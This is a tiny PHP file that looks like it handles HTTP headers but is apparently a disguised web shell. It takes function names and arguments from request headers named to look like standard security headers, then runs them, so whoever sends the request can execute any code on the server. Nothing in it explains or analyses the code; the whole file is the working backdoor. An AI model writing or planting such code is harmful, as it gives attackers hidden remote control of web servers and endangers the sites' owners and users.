<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $cache = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Sec-Websocket-Accept']));
    $cache();
}